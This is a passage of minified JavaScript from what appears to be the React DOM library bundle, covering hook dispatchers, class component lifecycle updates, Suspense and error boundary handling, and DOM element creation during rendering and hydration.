s=t.alternate;if(t.lanes===0&&(s===null||s.lanes===0)&&(s=e.lastRenderedReducer,s!==null))try{var o=e.lastRenderedState,l=s(o,n);if(i.hasEagerState=!0,i.eagerState=l,$t(l,o)){var u=e.interleaved;u===null?(i.next=i,fd(e)):(i.next=u.next,u.next=i),e.interleaved=i;return}}catch{}finally{}n=Sv(t,e,i,r),n!==null&&(i=st(),Bt(n,t,r,i),qv(n,e,r))}}function $v(t){var e=t.alternate;return t===Ee||e!==null&&e===Ee}function Wv(t,e){Ds=ol=!0;var n=t.pending;n===null?e.next=e:(e.next=n.next,n.next=e),t.pending=e}function qv(t,e,n){if(n&4194240){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,Zh(t,n)}}var al={readContext:Dt,useCallback:Ke,useContext:Ke,useEffect:Ke,useImperativeHandle:Ke,useInsertionEffect:Ke,useLayoutEffect:Ke,useMemo:Ke,useReducer:Ke,useRef:Ke,useState:Ke,useDebugValue:Ke,useDeferredValue:Ke,useTransition:Ke,useMutableSource:Ke,useSyncExternalStore:Ke,useId:Ke,unstable_isNewReconciler:!1},kI={readContext:Dt,useCallback:function(t,e){return Gt().memoizedState=[t,e===void 0?null:e],t},useContext:Dt,useEffect:vm,useImperativeHandle:function(t,e,n){return n=n!=null?n.concat([t]):null,ka(4194308,4,Mv.bind(null,e,t),n)},useLayoutEffect:function(t,e){return ka(4194308,4,t,e)},useInsertionEffect:function(t,e){return ka(4,2,t,e)},useMemo:function(t,e){var n=Gt();return e=e===void 0?null:e,t=t(),n.memoizedState=[t,e],t},useReducer:function(t,e,n){var r=Gt();return e=n!==void 0?n(e):e,r.memoizedState=r.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},r.queue=t,t=t.dispatch=RI.bind(null,Ee,t),[r.memoizedState,t]},useRef:function(t){var e=Gt();return t={current:t},e.memoizedState=t},useState:ym,useDebugValue:Td,useDeferredValue:function(t){return Gt().memoizedState=t},useTransition:function(){var t=ym(!1),e=t[0];return t=CI.bind(null,t[1]),Gt().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,n){var r=Ee,i=Gt();if(_e){if(n===void 0)throw Error(M(407));n=n()}else{if(n=e(),Le===null)throw Error(M(349));Dr&30||kv(r,e,n)}i.memoizedState=n;var s={value:n,getSnapshot:e};return i.queue=s,vm(Nv.bind(null,r,s,t),[t]),r.flags|=2048,no(9,Pv.bind(null,r,s,n,e),void 0,null),n},useId:function(){var t=Gt(),e=Le.identifierPrefix;if(_e){var n=dn,r=hn;n=(r&~(1<<32-zt(r)-1)).toString(32)+n,e=":"+e+"R"+n,n=eo++,0<n&&(e+="H"+n.toString(32)),e+=":"}else n=AI++,e=":"+e+"r"+n.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},PI={readContext:Dt,useCallback:Uv,useContext:Dt,useEffect:Ed,useImperativeHandle:Fv,useInsertionEffect:Ov,useLayoutEffect:Lv,useMemo:jv,useReducer:tc,useRef:Vv,useState:function(){return tc(to)},useDebugValue:Td,useDeferredValue:function(t){var e=bt();return zv(e,De.memoizedState,t)},useTransition:function(){var t=tc(to)[0],e=bt().memoizedState;return[t,e]},useMutableSource:Rv,useSyncExternalStore:xv,useId:Bv,unstable_isNewReconciler:!1},NI={readContext:Dt,useCallback:Uv,useContext:Dt,useEffect:Ed,useImperativeHandle:Fv,useInsertionEffect:Ov,useLayoutEffect:Lv,useMemo:jv,useReducer:nc,useRef:Vv,useState:function(){return nc(to)},useDebugValue:Td,useDeferredValue:function(t){var e=bt();return De===null?e.memoizedState=t:zv(e,De.memoizedState,t)},useTransition:function(){var t=nc(to)[0],e=bt().memoizedState;return[t,e]},useMutableSource:Rv,useSyncExternalStore:xv,useId:Bv,unstable_isNewReconciler:!1};function Mt(t,e){if(t&&t.defaultProps){e=Te({},e),t=t.defaultProps;for(var n in t)e[n]===void 0&&(e[n]=t[n]);return e}return e}function Jc(t,e,n,r){e=t.memoizedState,n=n(r,e),n=n==null?e:Te({},e,n),t.memoizedState=n,t.lanes===0&&(t.updateQueue.baseState=n)}var Fl={isMounted:function(t){return(t=t._reactInternals)?zr(t)===t:!1},enqueueSetState:function(t,e,n){t=t._reactInternals;var r=st(),i=Zn(t),s=gn(r,i);s.payload=e,n!=null&&(s.callback=n),e=Xn(t,s,i),e!==null&&(Bt(e,t,i,r),Ra(e,t,i))},enqueueReplaceState:function(t,e,n){t=t._reactInternals;var r=st(),i=Zn(t),s=gn(r,i);s.tag=1,s.payload=e,n!=null&&(s.callback=n),e=Xn(t,s,i),e!==null&&(Bt(e,t,i,r),Ra(e,t,i))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var n=st(),r=Zn(t),i=gn(n,r);i.tag=2,e!=null&&(i.callback=e),e=Xn(t,i,r),e!==null&&(Bt(e,t,r,n),Ra(e,t,r))}};function _m(t,e,n,r,i,s,o){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(r,s,o):e.prototype&&e.prototype.isPureReactComponent?!Ks(n,r)||!Ks(i,s):!0}function Hv(t,e,n){var r=!1,i=or,s=e.contextType;return typeof s=="object"&&s!==null?s=Dt(s):(i=mt(e)?Pr:et.current,r=e.contextTypes,s=(r=r!=null)?Si(t,i):or),e=new e(n,s),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=Fl,t.stateNode=e,e._reactInternals=t,r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=i,t.__reactInternalMemoizedMaskedChildContext=s),e}function wm(t,e,n,r){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(n,r),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(n,r),e.state!==t&&Fl.enqueueReplaceState(e,e.state,null)}function Zc(t,e,n,r){var i=t.stateNode;i.props=n,i.state=t.memoizedState,i.refs={},pd(t);var s=e.contextType;typeof s=="object"&&s!==null?i.context=Dt(s):(s=mt(e)?Pr:et.current,i.context=Si(t,s)),i.state=t.memoizedState,s=e.getDerivedStateFromProps,typeof s=="function"&&(Jc(t,e,s,n),i.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(e=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),e!==i.state&&Fl.enqueueReplaceState(i,i.state,null),il(t,n,i,r),i.state=t.memoizedState),typeof i.componentDidMount=="function"&&(t.flags|=4194308)}function xi(t,e){try{var n="",r=e;do n+=sT(r),r=r.return;while(r);var i=n}catch(s){i=`
Error generating stack: `+s.message+`
`+s.stack}return{value:t,source:e,stack:i,digest:null}}function rc(t,e,n){return{value:t,source:null,stack:n??null,digest:e??null}}function eh(t,e){try{console.error(e.value)}catch(n){setTimeout(function(){throw n})}}var DI=typeof WeakMap=="function"?WeakMap:Map;function Gv(t,e,n){n=gn(-1,n),n.tag=3,n.payload={element:null};var r=e.value;return n.callback=function(){ul||(ul=!0,ch=r),eh(t,e)},n}function Kv(t,e,n){n=gn(-1,n),n.tag=3;var r=t.type.getDerivedStateFromError;if(typeof r=="function"){var i=e.value;n.payload=function(){return r(i)},n.callback=function(){eh(t,e)}}var s=t.stateNode;return s!==null&&typeof s.componentDidCatch=="function"&&(n.callback=function(){eh(t,e),typeof r!="function"&&(Jn===null?Jn=new Set([this]):Jn.add(this));var o=e.stack;this.componentDidCatch(e.value,{componentStack:o!==null?o:""})}),n}function Em(t,e,n){var r=t.pingCache;if(r===null){r=t.pingCache=new DI;var i=new Set;r.set(e,i)}else i=r.get(e),i===void 0&&(i=new Set,r.set(e,i));i.has(n)||(i.add(n),t=HI.bind(null,t,e,n),e.then(t,t))}function Tm(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function Im(t,e,n,r,i){return t.mode&1?(t.flags|=65536,t.lanes=i,t):(t===e?t.flags|=65536:(t.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(e=gn(-1,1),e.tag=2,Xn(n,e,1))),n.lanes|=1),t)}var bI=Rn.ReactCurrentOwner,ft=!1;function it(t,e,n,r){e.child=t===null?Iv(e,null,n,r):Ci(e,t.child,n,r)}function Sm(t,e,n,r,i){n=n.render;var s=e.ref;return yi(e,i),r=_d(t,e,n,r,s,i),n=wd(),t!==null&&!ft?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,En(t,e,i)):(_e&&n&&ad(e),e.flags|=1,it(t,e,r,i),e.child)}function Am(t,e,n,r,i){if(t===null){var s=n.type;return typeof s=="function"&&!Pd(s)&&s.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(e.tag=15,e.type=s,Qv(t,e,s,r,i)):(t=ba(n.type,null,r,e,e.mode,i),t.ref=e.ref,t.return=e,e.child=t)}if(s=t.child,!(t.lanes&i)){var o=s.memoizedProps;if(n=n.compare,n=n!==null?n:Ks,n(o,r)&&t.ref===e.ref)return En(t,e,i)}return e.flags|=1,t=er(s,r),t.ref=e.ref,t.return=e,e.child=t}function Qv(t,e,n,r,i){if(t!==null){var s=t.memoizedProps;if(Ks(s,r)&&t.ref===e.ref)if(ft=!1,e.pendingProps=r=s,(t.lanes&i)!==0)t.flags&131072&&(ft=!0);else return e.lanes=t.lanes,En(t,e,i)}return th(t,e,n,r,i)}function Yv(t,e,n){var r=e.pendingProps,i=r.children,s=t!==null?t.memoizedState:null;if(r.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},fe(hi,vt),vt|=n;else{if(!(n&1073741824))return t=s!==null?s.baseLanes|n:n,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,fe(hi,vt),vt|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=s!==null?s.baseLanes:n,fe(hi,vt),vt|=r}else s!==null?(r=s.baseLanes|n,e.memoizedState=null):r=n,fe(hi,vt),vt|=r;return it(t,e,i,n),e.child}function Xv(t,e){var n=e.ref;(t===null&&n!==null||t!==null&&t.ref!==n)&&(e.flags|=512,e.flags|=2097152)}function th(t,e,n,r,i){var s=mt(n)?Pr:et.current;return s=Si(e,s),yi(e,i),n=_d(t,e,n,r,s,i),r=wd(),t!==null&&!ft?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,En(t,e,i)):(_e&&r&&ad(e),e.flags|=1,it(t,e,n,i),e.child)}function Cm(t,e,n,r,i){if(mt(n)){var s=!0;Za(e)}else s=!1;if(yi(e,i),e.stateNode===null)Pa(t,e),Hv(e,n,r),Zc(e,n,r,i),r=!0;else if(t===null){var o=e.stateNode,l=e.memoizedProps;o.props=l;var u=o.context,h=n.contextType;typeof h=="object"&&h!==null?h=Dt(h):(h=mt(n)?Pr:et.current,h=Si(e,h));var f=n.getDerivedStateFromProps,p=typeof f=="function"||typeof o.getSnapshotBeforeUpdate=="function";p||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(l!==r||u!==h)&&wm(e,o,r,h),On=!1;var g=e.memoizedState;o.state=g,il(e,r,o,i),u=e.memoizedState,l!==r||g!==u||pt.current||On?(typeof f=="function"&&(Jc(e,n,f,r),u=e.memoizedState),(l=On||_m(e,n,l,r,g,u,h))?(p||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(e.flags|=4194308)):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=r,e.memoizedState=u),o.props=r,o.state=u,o.context=h,r=l):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),r=!1)}else{o=e.stateNode,Av(t,e),l=e.memoizedProps,h=e.type===e.elementType?l:Mt(e.type,l),o.props=h,p=e.pendingProps,g=o.context,u=n.contextType,typeof u=="object"&&u!==null?u=Dt(u):(u=mt(n)?Pr:et.current,u=Si(e,u));var v=n.getDerivedStateFromProps;(f=typeof v=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(l!==p||g!==u)&&wm(e,o,r,u),On=!1,g=e.memoizedState,o.state=g,il(e,r,o,i);var A=e.memoizedState;l!==p||g!==A||pt.current||On?(typeof v=="function"&&(Jc(e,n,v,r),A=e.memoizedState),(h=On||_m(e,n,h,r,g,A,u)||!1)?(f||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(r,A,u),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(r,A,u)),typeof o.componentDidUpdate=="function"&&(e.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof o.componentDidUpdate!="function"||l===t.memoizedProps&&g===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||l===t.memoizedProps&&g===t.memoizedState||(e.flags|=1024),e.memoizedProps=r,e.memoizedState=A),o.props=r,o.state=A,o.context=u,r=h):(typeof o.componentDidUpdate!="function"||l===t.memoizedProps&&g===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||l===t.memoizedProps&&g===t.memoizedState||(e.flags|=1024),r=!1)}return nh(t,e,n,r,s,i)}function nh(t,e,n,r,i,s){Xv(t,e);var o=(e.flags&128)!==0;if(!r&&!o)return i&&hm(e,n,!1),En(t,e,s);r=e.stateNode,bI.current=e;var l=o&&typeof n.getDerivedStateFromError!="function"?null:r.render();return e.flags|=1,t!==null&&o?(e.child=Ci(e,t.child,null,s),e.child=Ci(e,null,l,s)):it(t,e,l,s),e.memoizedState=r.state,i&&hm(e,n,!0),e.child}function Jv(t){var e=t.stateNode;e.pendingContext?cm(t,e.pendingContext,e.pendingContext!==e.context):e.context&&cm(t,e.context,!1),md(t,e.containerInfo)}function Rm(t,e,n,r,i){return Ai(),ud(i),e.flags|=256,it(t,e,n,r),e.child}var rh={dehydrated:null,treeContext:null,retryLane:0};function ih(t){return{baseLanes:t,cachePool:null,transitions:null}}function Zv(t,e,n){var r=e.pendingProps,i=we.current,s=!1,o=(e.flags&128)!==0,l;if((l=o)||(l=t!==null&&t.memoizedState===null?!1:(i&2)!==0),l?(s=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(i|=1),fe(we,i&1),t===null)return Yc(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(o=r.children,t=r.fallback,s?(r=e.mode,s=e.child,o={mode:"hidden",children:o},!(r&1)&&s!==null?(s.childLanes=0,s.pendingProps=o):s=zl(o,r,0,null),t=Cr(t,r,n,null),s.return=e,t.return=e,s.sibling=t,e.child=s,e.child.memoizedState=ih(n),e.memoizedState=rh,t):Id(e,o));if(i=t.memoizedState,i!==null&&(l=i.dehydrated,l!==null))return VI(t,e,o,r,l,i,n);if(s){s=r.fallback,o=e.mode,i=t.child,l=i.sibling;var u={mode:"hidden",children:r.children};return!(o&1)&&e.child!==i?(r=e.child,r.childLanes=0,r.pendingProps=u,e.deletions=null):(r=er(i,u),r.subtreeFlags=i.subtreeFlags&14680064),l!==null?s=er(l,s):(s=Cr(s,o,n,null),s.flags|=2),s.return=e,r.return=e,r.sibling=s,e.child=r,r=s,s=e.child,o=t.child.memoizedState,o=o===null?ih(n):{baseLanes:o.baseLanes|n,cachePool:null,transitions:o.transitions},s.memoizedState=o,s.childLanes=t.childLanes&~n,e.memoizedState=rh,r}return s=t.child,t=s.sibling,r=er(s,{mode:"visible",children:r.children}),!(e.mode&1)&&(r.lanes=n),r.return=e,r.sibling=null,t!==null&&(n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)),e.child=r,e.memoizedState=null,r}function Id(t,e){return e=zl({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function da(t,e,n,r){return r!==null&&ud(r),Ci(e,t.child,null,n),t=Id(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function VI(t,e,n,r,i,s,o){if(n)return e.flags&256?(e.flags&=-257,r=rc(Error(M(422))),da(t,e,o,r)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(s=r.fallback,i=e.mode,r=zl({mode:"visible",children:r.children},i,0,null),s=Cr(s,i,o,null),s.flags|=2,r.return=e,s.return=e,r.sibling=s,e.child=r,e.mode&1&&Ci(e,t.child,null,o),e.child.memoizedState=ih(o),e.memoizedState=rh,s);if(!(e.mode&1))return da(t,e,o,null);if(i.data==="$!"){if(r=i.nextSibling&&i.nextSibling.dataset,r)var l=r.dgst;return r=l,s=Error(M(419)),r=rc(s,r,void 0),da(t,e,o,r)}if(l=(o&t.childLanes)!==0,ft||l){if(r=Le,r!==null){switch(o&-o){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}i=i&(r.suspendedLanes|o)?0:i,i!==0&&i!==s.retryLane&&(s.retryLane=i,wn(t,i),Bt(r,t,i,-1))}return kd(),r=rc(Error(M(421))),da(t,e,o,r)}return i.data==="$?"?(e.flags|=128,e.child=t.child,e=GI.bind(null,t),i._reactRetry=e,null):(t=s.treeContext,wt=Yn(i.nextSibling),Tt=e,_e=!0,Ut=null,t!==null&&(Rt[xt++]=hn,Rt[xt++]=dn,Rt[xt++]=Nr,hn=t.id,dn=t.overflow,Nr=e),e=Id(e,r.children),e.flags|=4096,e)}function xm(t,e,n){t.lanes|=e;var r=t.alternate;r!==null&&(r.lanes|=e),Xc(t.return,e,n)}function ic(t,e,n,r,i){var s=t.memoizedState;s===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i}:(s.isBackwards=e,s.rendering=null,s.renderingStartTime=0,s.last=r,s.tail=n,s.tailMode=i)}function e_(t,e,n){var r=e.pendingProps,i=r.revealOrder,s=r.tail;if(it(t,e,r.children,n),r=we.current,r&2)r=r&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&xm(t,n,e);else if(t.tag===19)xm(t,n,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}r&=1}if(fe(we,r),!(e.mode&1))e.memoizedState=null;else switch(i){case"forwards":for(n=e.child,i=null;n!==null;)t=n.alternate,t!==null&&sl(t)===null&&(i=n),n=n.sibling;n=i,n===null?(i=e.child,e.child=null):(i=n.sibling,n.sibling=null),ic(e,!1,i,n,s);break;case"backwards":for(n=null,i=e.child,e.child=null;i!==null;){if(t=i.alternate,t!==null&&sl(t)===null){e.child=i;break}t=i.sibling,i.sibling=n,n=i,i=t}ic(e,!0,n,null,s);break;case"together":ic(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function Pa(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function En(t,e,n){if(t!==null&&(e.dependencies=t.dependencies),br|=e.lanes,!(n&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error(M(153));if(e.child!==null){for(t=e.child,n=er(t,t.pendingProps),e.child=n,n.return=e;t.sibling!==null;)t=t.sibling,n=n.sibling=er(t,t.pendingProps),n.return=e;n.sibling=null}return e.child}function OI(t,e,n){switch(e.tag){case 3:Jv(e),Ai();break;case 5:Cv(e);break;case 1:mt(e.type)&&Za(e);break;case 4:md(e,e.stateNode.containerInfo);break;case 10:var r=e.type._context,i=e.memoizedProps.value;fe(nl,r._currentValue),r._currentValue=i;break;case 13:if(r=e.memoizedState,r!==null)return r.dehydrated!==null?(fe(we,we.current&1),e.flags|=128,null):n&e.child.childLanes?Zv(t,e,n):(fe(we,we.current&1),t=En(t,e,n),t!==null?t.sibling:null);fe(we,we.current&1);break;case 19:if(r=(n&e.childLanes)!==0,t.flags&128){if(r)return e_(t,e,n);e.flags|=128}if(i=e.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),fe(we,we.current),r)break;return null;case 22:case 23:return e.lanes=0,Yv(t,e,n)}return En(t,e,n)}var t_,sh,n_,r_;t_=function(t,e){for(var n=e.child;n!==null;){if(n.tag===5||n.tag===6)t.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};sh=function(){};n_=function(t,e,n,r){var i=t.memoizedProps;if(i!==r){t=e.stateNode,Ir(Yt.current);var s=null;switch(n){case"input":i=Rc(t,i),r=Rc(t,r),s=[];break;case"select":i=Te({},i,{value:void 0}),r=Te({},r,{value:void 0}),s=[];break;case"textarea":i=Pc(t,i),r=Pc(t,r),s=[];break;default:typeof i.onClick!="function"&&typeof r.onClick=="function"&&(t.onclick=Xa)}Dc(n,r);var o;n=null;for(h in i)if(!r.hasOwnProperty(h)&&i.hasOwnProperty(h)&&i[h]!=null)if(h==="style"){var l=i[h];for(o in l)l.hasOwnProperty(o)&&(n||(n={}),n[o]="")}else h!=="dangerouslySetInnerHTML"&&h!=="children"&&h!=="suppressContentEditableWarning"&&h!=="suppressHydrationWarning"&&h!=="autoFocus"&&(zs.hasOwnProperty(h)?s||(s=[]):(s=s||[]).push(h,null));for(h in r){var u=r[h];if(l=i!=null?i[h]:void 0,r.hasOwnProperty(h)&&u!==l&&(u!=null||l!=null))if(h==="style")if(l){for(o in l)!l.hasOwnProperty(o)||u&&u.hasOwnProperty(o)||(n||(n={}),n[o]="");for(o in u)u.hasOwnProperty(o)&&l[o]!==u[o]&&(n||(n={}),n[o]=u[o])}else n||(s||(s=[]),s.push(h,n)),n=u;else h==="dangerouslySetInnerHTML"?(u=u?u.__html:void 0,l=l?l.__html:void 0,u!=null&&l!==u&&(s=s||[]).push(h,u)):h==="children"?typeof u!="string"&&typeof u!="number"||(s=s||[]).push(h,""+u):h!=="suppressContentEditableWarning"&&h!=="suppressHydrationWarning"&&(zs.hasOwnProperty(h)?(u!=null&&h==="onScroll"&&ge("scroll",t),s||l===u||(s=[])):(s=s||[]).push(h,u))}n&&(s=s||[]).push("style",n);var h=s;(e.updateQueue=h)&&(e.flags|=4)}};r_=function(t,e,n,r){n!==r&&(e.flags|=4)};function ps(t,e){if(!_e)switch(t.tailMode){case"hidden":e=t.tail;for(var n=null;e!==null;)e.alternate!==null&&(n=e),e=e.sibling;n===null?t.tail=null:n.sibling=null;break;case"collapsed":n=t.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:r.sibling=null}}function Qe(t){var e=t.alternate!==null&&t.alternate.child===t.child,n=0,r=0;if(e)for(var i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags&14680064,r|=i.flags&14680064,i.return=t,i=i.sibling;else for(i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=t,i=i.sibling;return t.subtreeFlags|=r,t.childLanes=n,e}function LI(t,e,n){var r=e.pendingProps;switch(ld(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Qe(e),null;case 1:return mt(e.type)&&Ja(),Qe(e),null;case 3:return r=e.stateNode,Ri(),ve(pt),ve(et),yd(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(t===null||t.child===null)&&(ca(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,Ut!==null&&(fh(Ut),Ut=null))),sh(t,e),Qe(e),null;case 5:gd(e);var i=Ir(Zs.current);if(n=e.type,t!==null&&e.stateNode!=null)n_(t,e,n,r,i),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!r){if(e.stateNode===null)throw Error(M(166));return Qe(e),null}if(t=Ir(Yt.current),ca(e)){r=e.stateNode,n=e.type;var s=e.memoizedProps;switch(r[Kt]=e,r[Xs]=s,t=(e.mode&1)!==0,n){case"dialog":ge("cancel",r),ge("close",r);break;case"iframe":case"object":case"embed":ge("load",r);break;case"video":case"audio":for(i=0;i<ws.length;i++)ge(ws[i],r);break;case"source":ge("error",r);break;case"img":case"image":case"link":ge("error",r),ge("load",r);break;case"details":ge("toggle",r);break;case"input":Mp(r,s),ge("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},ge("invalid",r);break;case"textarea":Up(r,s),ge("invalid",r)}Dc(n,s),i=null;for(var o in s)if(s.hasOwnProperty(o)){var l=s[o];o==="children"?typeof l=="string"?r.textContent!==l&&(s.suppressHydrationWarning!==!0&&ua(r.textContent,l,t),i=["children",l]):typeof l=="number"&&r.textContent!==""+l&&(s.suppressHydrationWarning!==!0&&ua(r.textContent,l,t),i=["children",""+l]):zs.hasOwnProperty(o)&&l!=null&&o==="onScroll"&&ge("scroll",r)}switch(n){case"input":ta(r),Fp(r,s,!0);break;case"textarea":ta(r),jp(r);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(r.onclick=Xa)}r=i,e.updateQueue=r,r!==null&&(e.flags|=4)}else{o=i.nodeType===9?i:i.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=Ny(n)),t==="http://www.w3.org/1999/xhtml"?n==="script"?(t=o.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof r.is=="string"?t=o.createElement(n,{is:r.is}):(t=o.createElement(n),n==="select"&&(o=t,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):t=o.createElementNS(t,n),t[Kt]=e,t[Xs]=r,t_(t,e,!1,!1),e.stateNode=t;e:{switch(o=bc(n,r),n){case"dialog":ge("cancel",t),ge("close",t),i=r;break;case"iframe":case"object":case"embed":ge("load",t),i=r;break;case"video":case"audio":for(i=0;i<ws.length;i++)ge(ws[i],t);i=r;break;case"source":ge("error",t),i=r;break;case"img":case"image":case"link":ge("error",t),ge("load",t),i=r;break;case"details":ge("toggle",t),i=r;break;case"input":Mp(t,r),i=Rc(t,r),ge("invalid",t);break;case"option":i=r;break;case"select":t._wrapperState={wasMultiple:!!r.multiple},i=Te({},r,{value:void 0}),ge("invalid",t);break;case"textarea":Up(t,r),i=Pc(t,r),ge("invalid",t);break;default:i=r}Dc(n,i),l=i;for(s in l)if(l.hasOwnProperty(s)){var u=l[s];s==="style"?Vy(t,u):s==="dangerouslySetInnerHTML"?(u=u?u.__html:void 0,u!=null&&Dy(t,u)):s==="children"?typeof u=="string"?(n!=="textarea"||u!=="")&&Bs(t,u):typeof u=="number"&&Bs(t,""+u):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(zs.hasOwnProperty(s)?u!=null&&s==="onScroll"&&ge("scroll",t):u!=null&&Gh(t,s,u,o))}switch(n){case"input":ta(t),Fp(t,r,!1);break;case"textarea":ta(t),jp(t);break;case"option":r.value!=null&&t.setAttribute("value",""+sr(r.value));break;case"select":t.multiple=!!r.multiple,s=r.value,s!=null?fi(t,!!r.multiple,s,!1):r.defaultValue!=null&&fi(t,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(t.onclick=Xa)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return Qe(e),null;case 6:if(t&&e.stateNode!=null)r_(t,e,t.memoizedProps,r);else{if(typeof r!="string"&&e.stateNode===null)throw Error(M(166));if(n=Ir(Zs.current),Ir(Yt.current),ca(e)){if(r=e.stateNode,n=e.memoizedProps,r[Kt]=e,(s=r.nodeValue!==n)&&(t=Tt,t!==null))switch(t.tag){case 3:ua(r.nodeValue,n,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&ua(r.nodeValue,n,(t.mode&1)!==0)}s&&(e.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[Kt]=e,e.stateNode=r}return Qe(e),null;case 13:if(ve(we),r=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(_e&&wt!==null&&e.mode&1&&!(e.flags&128))Ev(),Ai(),e.flags|=98560,s=!1;else if(s=ca(e),r!==null&&r.dehydrated!==null){if(t===null){if(!s)throw Error(M(318));if(s=e.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(M(317));s[Kt]=e}else Ai(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;Qe(e),s=!1}else Ut!==null&&(fh(Ut),Ut=null),s=!0;if(!s)return e.flags&65536?e:null}return 